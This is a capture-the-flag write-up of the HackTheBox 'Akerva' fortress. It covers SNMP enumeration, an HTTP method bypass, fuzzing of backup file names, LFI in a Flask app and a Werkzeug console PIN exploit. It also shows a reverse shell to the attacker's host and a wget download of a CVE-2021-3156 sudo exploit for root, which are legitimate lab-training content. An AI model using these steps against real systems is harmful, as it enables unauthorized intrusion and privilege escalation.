# **Akerva - HackTheBox Fortress**

*Fortress IP: 10.13.37.11*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.13.37.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 08:00 +0545
Nmap scan report for 10.13.37.11
Host is up (0.72s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)
|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.4-alpha-47225
5000/tcp open  http    Python BaseHTTPServer http.server 2 or 3.0 - 3.1
| http-auth: 
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Authentication Required
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.24 seconds
```

So, we have 3 ports. Port 22 (ssh), Port 80 & 5000 (http). Port 5000 shows 401 Unauthorized, will get there later.

Read the source code of website at port 80, we get first flag.

```html
<!-- Hello folks! -->
<!-- This machine is powered by @lydericlefebvre from Akerva company. -->
<!-- You have to find 8 flags on this machine. Have a nice root! -->
<!-- By the way, the first flag is: AKERVA{Ik.....ts} -->
```
```flag
Flag 1: AKERVA{Ik.....ts}
```

We see nothing interesting. Let's check if we missed any UDP ports.

```bash
kali@kali:nmap -sU 10.13.37.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 08:17 +0545
Nmap scan report for 10.13.37.11
Host is up (0.68s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 1004.03 seconds
```

Waiting was worth it, we have snmp open. Let's use metasploit to enumerate SNMP.

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_enum) >> show options
Module options (auxiliary/scanner/snmp/snmp_enum):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS     10.13.37.11      yes       The target host(s), see https://docs.metasploit.com
                                         /docs/using-metasploit/basics/using-metasploit.html
   RPORT      161              yes       The target port (UDP)
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    1                yes       SNMP Timeout
   VERSION    1                yes       SNMP Version <1/2c>
View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_enum) >> run
[+] 10.13.37.11, Connected.
[*] System information:
Host IP                       : 10.13.37.11
Hostname                      : Leakage
Description                   : Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64
Contact                       : Me <me@example.org>
Location                      : Sitting on the Dock of the Bay
Uptime snmp                   : 5 days, 06:31:37.69
Uptime system                 : 5 days, 06:31:27.92
System date                   : 2026-02-17 08:20:32.0

[*] Software components:
Index               Name
1                   accountsservice-0.6.45-1ubuntu1
442                 mysql-client-5.7-5.7.29-0ubuntu0.18.04.1
443                 mysql-client-core-5.7-5.7.29-0ubuntu0.18.04.1
444                 mysql-common-5.8+1.0.4
445                 mysql-server-5.7.29-0ubuntu0.18.04.1
446                 mysql-server-5.7-5.7.29-0ubuntu0.18.04.1
447                 mysql-server-core-5.7-5.7.29-0ubuntu0.18.04.1
646                 xauth-1:1.0.10-1

<snip>                                 /bin/bash           /opt/check_backup.sh
1238                runnable            backup_every_17     /bin/bash           /var/www/html/scripts/backup_every_17minutes.sh AKERVA{IkN0...nS}
1245                runnable            uuidd               /usr/sbin/uuidd     --socket-activation                                        
12787               runnable            apache2             /usr/sbin/apache2   -k start                           
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
```flag
Flag 2: AKERVA{IkN0...nS}
```

We see that '/var/www/html/scripts/backup_every_17minutes.sh' is running, let's check.

```bash
kali@kali:curl -X GET http://10.13.37.11/scripts/backup_every_17minutes.sh
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.13.37.11 Port 80</address>
</body></html>
```

We get 401 unauthorized with GET request, let's see if other methods are allowed.

```bash
kali@kali:curl -X POST http://10.13.37.11/scripts/backup_every_17minutes.sh
#!/bin/bash
#
# This script performs backups of production and development websites.
# Backups are done every 17 minutes.
#
# AKERVA{IK.....G_==}
#

SAVE_DIR=/var/www/html/backups

while true
do
        ARCHIVE_NAME=backup_$(date +%Y%m%d%H%M%S)
        echo "Erasing old backups..."
        rm -rf $SAVE_DIR/*

        echo "Backuping..."
        zip -r $SAVE_DIR/$ARCHIVE_NAME /var/www/html/*

        echo "Done..."
        sleep 1020
done
```
```flag
Flag 3: AKERVA{IK.....G_==}
```

We see that, the backup archive can be determined as it is just the system date.

```bash
kali@kali:curl -I 10.13.37.11 | grep -i Date
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0           00:01              0
Date: Thu, 19 Feb 2026 07:36:53 GMT
```

Now, we know the system date, let's generate a wordlist for fuzzing the archive.

```bash
kali@kali:seq 0000 9999 > wordlist.txt
```

Let's fuzz the request with wfuzz.

```bash
kali@kali:wfuzz -u http://10.13.37.11/backups/backup_2026021907FUZZ.zip -w wordlist.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.37.11/backups/backup_2026021907FUZZ.zip
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================

000004204:   200        82458    810808 W   20934497    "4203"    
```

We got a hit. Let's download the backup archive.

```bash
kali@kali:wget http://10.13.37.11/backups/backup_20260219074203.zip
--2026-02-19 13:17:05--  http://10.13.37.11/backups/backup_20260219074203.zip
Connecting to 10.13.37.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22071775 (21M) [application/zip]
Saving to: ‘backup_20260219074203.zip’

backup_20260219074203.zip     100%[=======================================>]  21.05M   238KB/s    in 65s     

2026-02-19 13:18:11 (331 KB/s) - ‘backup_20260219074203.zip’ saved [22071775/22071775]
```

Extract the zip.

```bash
kali@kali:ls
backup_20260219074203.zip  var
```

Let's see if we can get anything from the source code.

```bash
kali@kali:cat space_dev.py
#!/usr/bin/python

from flask import Flask, request
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
auth = HTTPBasicAuth()

users = {
        "aas": generate_password_hash("AKERVA{1k....T_$$$$$$$$}")
        }

@auth.verify_password
def verify_password(username, password):
    if username in users:
        return check_password_hash(users.get(username), password)
    return False

@app.route('/')
@auth.login_required
def hello_world():
    return 'Hello, World!'

# TODO
@app.route('/download')
@auth.login_required
def download():
    return downloaded_file

@app.route("/file")
@auth.login_required
def file():
        filename = request.args.get('filename')
        try:
                with open(filename, 'r') as f:
                        return f.read()
        except:
                return 'error'

if __name__ == '__main__':
    print(app)
    print(getattr(app, '__name__', getattr(app.__class__, '__name__')))
    app.run(host='0.0.0.0', port='5000', debug = True)
```
```flag
Flag 4: AKERVA{1k....T_$$$$$$$$}
```

We can login to port 5000, with this credentials, there is nothing except "Hello, World!".

From space_dev.py, we see there are 2 endpoints, /download and /file. The code logic on the /file endpoint suggests a possible LFI with ?filename=.

Just as thought, we have LFI now.

There are only 2 users with bash: root and aas. aas was also the username, we used to login in this 5000 port.

<img width="1066" height="247" alt="Screenshot 2026-02-19 133507" src="https://github.com/user-attachments/assets/ab4d0937-a370-43bd-80d5-7ebd20b09ac6" />

```flag
Flag 5: AKERVA{IK.....i_@_} 
```

Let's see if we can find some more endpoints on port 5000.

```bash
kali@kali:gobuster dir -u http://10.13.37.11:5000/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.13.37.11:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
console              (Status: 200) [Size: 1985]
download             (Status: 401) [Size: 19]
file                 (Status: 401) [Size: 19]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

We have /console which has an Interactive console that needs pin.

<img width="1027" height="425" alt="Screenshot 2026-02-19 134021" src="https://github.com/user-attachments/assets/32d51873-d677-4677-8aec-c592d793f6ba" />

This is a werkzeug console. We can find exploit for getting pin here "*https://www.daehee.com/blog/werkzeug-console-pin-exploit*".

We need following things:

```credentials
1. username: aas
2. machine_id: /etc/machine-id, get this from LFI
3. uuid.getnode: /sys/class/net/ens33/address, get this from LFI. It will drop MAC address, convert it using python.
```

```mac
MAC Address: 00:50:56:94:0d:02 
```

We have MAC Address, let's convert it to decimal value using python.

```bash
kali@kali:python
Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x5056940d02)
345049926914
```

Edit all the required fields, in the exploit and run.

```bash
kali@kali:python3 exploit.py
285-691-244
```
Let's login with the pin we got from the exploit to login to /console.

<img width="1063" height="317" alt="Screenshot 2026-02-19 135138" src="https://github.com/user-attachments/assets/19675b64-ee77-45bd-a55e-537e92abd0e4" />

Since, we are inside the interactive console, we can run the reverse shell.

Start a listener.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
```

You can use any python reverse shell on the console.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.8] from (UNKNOWN) [10.13.37.11] 47152
aas@Leakage:~$ id
id
uid=1000(aas) gid=1000(aas) groups=1000(aas),24(cdrom),30(dip),46(plugdev)
```

We are inside the system. Let's upgrade the pty to make it more interactive.

```bash
aas@Leakage:~$ python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

Let's see if we have anything interesting in the home directory.

```bash
aas@Leakage:~$ ls -la
ls -la
total 28
drwxr-xr-x 3 aas  aas  4096 Feb  9  2020 .
drwxr-xr-x 3 root root 4096 Feb  9  2020 ..
-rw------- 1 root root    0 Dec  7  2019 .bash_history
-rw-r--r-- 1 aas  aas   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aas  aas  3771 Apr  4  2018 .bashrc
-r-------- 1 aas  aas    21 Feb  9  2020 flag.txt
-rw-r--r-- 1 root root   38 Feb  9  2020 .hiddenflag.txt
dr-xr-x--- 2 aas  aas  4096 Feb 10  2020 .sshcd ..
```

We have another flag.

```bash
aas@Leakage:~$ cat .hiddenflag.txt
cat .hiddenflag.txt
AKERVA{IkN.....de!}
```
```flag
Flag 6: AKERVA{IkN.....de!}
```

We have no sudo permissions, no SUID.

```bash
aas@Leakage:~$ sudo --version
sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

Checking the sudo version, it is running version 1.8.21p2. This is an old version and has an exploit which is CVE-2021-3156.

We can get the exploit code from "*https://github.com/worawit/CVE-2021-3156*".

Run python server on attacker machine.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Receive the exploit on the target machine.

```bash
aas@Leakage:/tmp$ wget http://10.10.16.8/exploitsudo.py
wget http://10.10.16.8/exploitsudo.py
--2026-02-19 08:43:30--  http://10.10.16.8/exploitsudo.py
Connecting to 10.10.16.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8179 (8.0K) [text/x-python]
Saving to: ‘exploitsudo.py’

exploitsudo.py      100%[===================>]   7.99K  16.8KB/s    in 0.5s    

2026-02-19 08:43:31 (16.8 KB/s) - ‘exploitsudo.py’ saved [8179/8179]
```

Let's run the exploit.

```bash
aas@Leakage:/tmp$ python3 exploitsudo.py
python3 exploitsudo.py
# id
id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(aas)
```

Now, we are root. Let's move to root directory.

```bash
# cat flag.txt  
cat flag.txt
AKERVA{IkN.....S!}
```
```flag
Flag 7: AKERVA{IkN.....S!}
```

We have another hint too.

```bash
# cat secured_note.md
cat secured_note.md
R09B.....VLSEUK

@AKERVA_FR | @lydericlefebvre
```

This is base64 enocded, let's decode it.

```bash
kali@kali:echo "R09B.....VLSEUK" | base64 -d
GOAHG.....MSYELS
```

We have Vigenère cipher, we can decode it in "*https://www.dcode.fr/vigenere-cipher*".

The encoded text has missing BJQXZ, we can remove these from the alphabet. And also add 'AKERVA' as a plaintext as we know the flag contains it.

<img width="1278" height="587" alt="Screenshot 2026-02-19 143440" src="https://github.com/user-attachments/assets/42e37726-4b14-4bdd-add8-823c0f2ab138" />

We finally decoded the last flag, that completes the challenge.
```flag
Flag 8: AKERVA{IKN.....RE}
```
